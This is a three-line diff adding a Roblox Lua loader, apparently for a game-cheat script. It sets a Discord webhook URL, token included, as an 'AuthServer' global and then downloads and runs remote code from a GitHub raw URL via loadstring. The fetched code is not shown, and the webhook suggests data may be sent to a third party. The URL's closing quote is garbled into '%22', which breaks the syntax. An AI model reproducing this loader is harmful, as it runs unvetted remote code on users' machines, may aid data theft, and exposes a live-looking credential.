@@ -1,0 +1,3 @@
+_G.Key = "sadrobloxo"
+_G.AuthServer = "https://discord.com/api/webhooks/1084387980652847115/Yo_Df3jZIoF5f8l-a-augRRQH-I9YJu41khu8EGbInTyzwgJSZxHaKWc5lCzA8scTwP0"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua%22))()
